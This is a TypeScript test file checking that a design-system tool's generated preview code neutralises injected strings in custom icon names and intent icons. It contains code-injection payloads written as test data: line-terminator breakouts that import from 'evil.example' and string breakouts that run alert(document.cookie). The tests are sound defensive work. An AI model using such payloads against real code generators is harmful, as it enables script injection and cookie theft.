import { PRESETS } from "@tesserai/core";
import { describe, expect, it } from "vitest";
import { customIconsFile } from "./icons";
import { lucideName, renderComponent } from "./render";

// The code sinks a system's strings reach (the failure list is in core's injection.test.ts):
// 1. a custom icon's name written into a // comment ends it with any JS line terminator;
// 2. an intent's icon written where the generated code expects an identifier.
// These check the templates themselves, past the schema: a system that skipped it (an old save,
// a bug) must still not become code.

const LINE_TERMINATORS = /[\r\n\u2028\u2029]/;
const svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z"/></svg>';

describe("a system's strings stay out of the code the preview runs", () => {
  it("keeps a custom icon's name on its comment line, whatever line break it holds (1)", () => {
    for (const name of ["a\rimport('//evil.example/x')\r", "a\u2028import('//evil')", "a\u2029import('//evil')", "a\nimport('//evil')"]) {
      const file = customIconsFile({ icons: { library: "lucide", custom: { logo: { name, svg } } } } as never)!;
      const line = file.source.split("\n").find((l) => l.includes("evil"))!;
      expect(line.startsWith("// "), JSON.stringify(name)).toBe(true);
      expect(LINE_TERMINATORS.test(line), JSON.stringify(name)).toBe(false);
    }
  });

  it("writes an intent's icon only as an identifier (2)", async () => {
    expect(lucideName('circle-alert");}alert(document.cookie);const x=("')).toMatch(/^[A-Za-z0-9]+Icon$/);
    expect(lucideName("circle-alert")).toBe("CircleAlertIcon");
    const system = PRESETS[0]!.build();
    const source = await renderComponent("radix", system.components["toast"]!, { intents: { ...system.intents, danger: { scale: "color.red", icon: 'x");}alert(1);("' } } }, { format: false });
    expect(source).not.toContain("alert(1)");
  });
});
